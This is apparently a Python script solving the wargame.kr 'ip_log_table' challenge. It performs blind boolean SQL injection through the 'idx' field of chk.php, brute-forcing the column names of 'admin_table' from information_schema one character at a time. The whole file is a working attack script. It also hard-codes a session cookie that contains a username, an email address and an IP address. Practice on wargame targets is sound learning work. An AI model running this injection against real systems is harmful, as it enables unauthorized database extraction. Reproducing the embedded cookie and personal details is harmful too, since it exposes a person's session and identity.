import requests

url = 'http://wargame.kr:8080/ip_log_table/chk.php'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'ci_session':'a%3A10%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229b0fed830dde447c1390e246dddba029%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22222.110.147.52%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.121+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1552642922%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A7%3A%22noonzib%22%3Bs%3A5%3A%22email%22%3Bs%3A19%3A%22noonzib14%40gmail.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22default%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%223896%22%3B%7Dd857841bc863c791271b32292c618e77652c5c3f'}
flag=""
i = 1
limit=2
while True:
    for j in range(33, 123):
        data = {'idx': "37869 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x"+"admin_table".encode('hex')+" limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"}
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        status_code = response.status_code
        html_data = response.text
        print "37869 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x"+"admin_table".encode('hex')+" limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"
        if (html_data.find("2019-03-15") != -1):
            flag += chr(j)
            print "[+]Find : " + flag
            break
    if(j==122):
        print "No more column!"
        break
    i += 1
print "[*]End"
print "[+]column is " + flag